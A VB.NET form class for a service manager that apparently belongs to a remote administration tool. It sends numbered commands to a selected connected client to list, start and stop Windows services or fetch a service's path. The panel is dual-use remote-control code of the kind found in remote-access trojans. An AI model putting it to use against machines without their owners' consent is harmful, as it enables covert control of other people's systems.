Public Class Servicemanager

    Private Sub ButtonRefreshServices_Click(sender As Object, e As EventArgs) Handles ButtonRefreshServices.Click
        Settings.AddLog("Pending", Settings.State.Pending, "Refreshing servicelist...")
        ListViewServices.Items.Clear()
        If Main.ListViewMain.Items.Count > 0 Then
            If Main.ListViewMain.SelectedItems.Count <> 0 Then _
                Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
        Else
            MsgBox("No Users online.", MsgBoxStyle.Exclamation)
        End If
        Try
            Main.WriteCommand(Main.SelectedUserID & "|9")
            Waiting.ShowDialog()
        Catch x As Exception
            MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Servicemanager")
        End Try
    End Sub


    Public Sub SplitData(ByVal Data As String)
        Dim lines() = Data.Split({";;;"}, StringSplitOptions.None)
        For Each line In lines
            Dim parts() = line.Split({"|||"}, StringSplitOptions.None)
            Dim item = ListViewServices.Items.Add(parts(0))
            For i = 1 To Math.Min(parts.Length - 1, 3)
                item.SubItems.Add(parts(i))

                If i = 2 Then
                    Select Case item.SubItems(2).Text
                        Case "Running"
                            item.ImageIndex = 0
                        Case "Stopped"
                            item.ImageIndex = 1
                        Case "Unknown"
                            item.ImageIndex = 2
                    End Select
                End If
            Next
        Next

        For Each item As ListViewItem In ListViewServices.Items
            If (String.IsNullOrWhiteSpace(item.Text) Or String.IsNullOrEmpty(item.Text)) Then
                item.Remove()
            End If
        Next
    End Sub

    Private Sub Servicemanager_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        ListViewServices.Items.Clear()
    End Sub

    Private Sub StartServiceToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StartServiceToolStripMenuItem.Click
        If Main.ListViewMain.Items.Count > 0 Then
            If Me.ListViewServices.SelectedItems.Count > 0 Then
                Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
                Try
                    Main.WriteData(ListViewServices.SelectedItems(0).Text)
                    Main.WriteCommand(Main.SelectedUserID & "|10")
                    Waiting.ShowDialog()
                Catch x As Exception
                    MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Servicemanager")
                End Try
            End If
        Else
            MsgBox("Select a service to start.", MsgBoxStyle.Exclamation)
        End If
    End Sub

    Private Sub StopServiceToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StopServiceToolStripMenuItem.Click
        If Main.ListViewMain.Items.Count > 0 Then
            If Me.ListViewServices.SelectedItems.Count > 0 Then
                Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
                Try
                    Main.WriteData(ListViewServices.SelectedItems(0).Text)
                    Main.WriteCommand(Main.SelectedUserID & "|11")
                    Waiting.ShowDialog()
                Catch x As Exception
                    MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Servicemanager")
                End Try
            End If
        Else
            MsgBox("Select a service to stop.", MsgBoxStyle.Exclamation)
        End If
    End Sub

    Private Sub GetServicepathToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles GetServicepathToolStripMenuItem.Click
        If Main.ListViewMain.Items.Count > 0 Then
            If Me.ListViewServices.SelectedItems.Count > 0 Then
                Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
                Try
                    Main.WriteData(ListViewServices.SelectedItems(0).Text)
                    Main.WriteCommand(Main.SelectedUserID & "|12")
                    Waiting.ShowDialog()
                Catch x As Exception
                    MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Servicemanager")
                End Try
            End If
        Else
            MsgBox("Select a service to grab the path from.", MsgBoxStyle.Exclamation)
        End If
    End Sub
End Class